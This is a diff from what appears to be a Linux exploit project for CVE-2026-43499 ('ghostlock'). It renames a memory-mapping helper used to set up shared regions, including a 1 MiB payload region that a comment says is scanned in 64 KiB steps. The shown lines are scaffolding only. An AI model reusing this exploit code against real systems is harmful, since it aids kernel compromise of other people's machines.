@@ -5,7 +5,7 @@
 
 #include <cstdio>
 
-#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
+#include "backend/cve_2026_43499/leak/snitch_ops_linux.hpp"
 
 namespace ghostlock::backend::cve_2026_43499::steps {
     namespace {
@@ -21,13 +21,13 @@ namespace ghostlock::backend::cve_2026_43499::steps {
         if (count == 0U || count > kMaxWords) {
             return false;
         }
-        const auto mapped = leak::LinuxSnitchSeam::map_shared(kWordsRegionBytes);
+        const auto mapped = leak::LinuxSnitchOps::map_shared(kWordsRegionBytes);
         if (mapped.address == nullptr) {
             return false;
         }
         region_ = mapped.address;
         /* 载荷专用映射：1 MiB，好按 64 KiB 步长挑出满足判据的那一块。 */
-        const auto payload_mapped = leak::LinuxSnitchSeam::map_shared(kPayloadRegionBytes);
+        const auto payload_mapped = leak::LinuxSnitchOps::map_shared(kPayloadRegionBytes);
         if (payload_mapped.address == nullptr) {
             close();
             return false;
@@ -57,11 +57,11 @@ namespace ghostlock::backend::cve_2026_43499::steps {
 
     void WordsRegion::close() noexcept {
         if (payload_region_ != nullptr) {
-            static_cast<void>(leak::LinuxSnitchSeam::unmap(payload_region_, kPayloadRegionBytes));
+            static_cast<void>(leak::LinuxSnitchOps::unmap(payload_region_, kPayloadRegionBytes));
             payload_region_ = nullptr;
         }
         if (region_ != nullptr) {
-            static_cast<void>(leak::LinuxSnitchSeam::unmap(region_, kWordsRegionBytes));
+            static_cast<void>(leak::LinuxSnitchOps::unmap(region_, kWordsRegionBytes));
             region_ = nullptr;
         }
         for (std::size_t i = 0U; i < kMaxWords; ++i) {
